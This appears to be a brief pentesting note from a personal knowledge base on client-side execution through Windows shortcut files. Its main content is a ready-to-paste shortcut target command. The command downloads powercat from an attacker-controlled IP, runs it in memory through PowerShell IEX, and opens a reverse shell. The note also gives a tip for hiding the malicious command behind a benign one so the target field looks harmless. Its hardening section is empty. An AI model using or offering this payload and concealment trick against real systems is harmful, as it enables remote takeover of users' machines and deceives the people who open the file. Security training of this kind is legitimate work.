---
tags:
  - "#type/tech-specific" 
  - "#attack/execution/client-side" 
---
# Fundamentals

# Pentesting

## Execution

### Shortcut Files

Shortcut files can be used to launch programs, e.g. [[3 Tools/shells/PowerShell|PowerShell]] with a reverse shell payload. The "target" field has a 260 character limit!

**Hint:** Put a benign command before the actual command to bush the malicious command out of visible area in the text field.

**Example: Target definition to download powercat, inject it in powershell seccion and start reverse shell:**

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.202:80/powercat.ps1'); powercat -c 192.168.45.202 -p 4443 -e powershell"
```

# Hardening
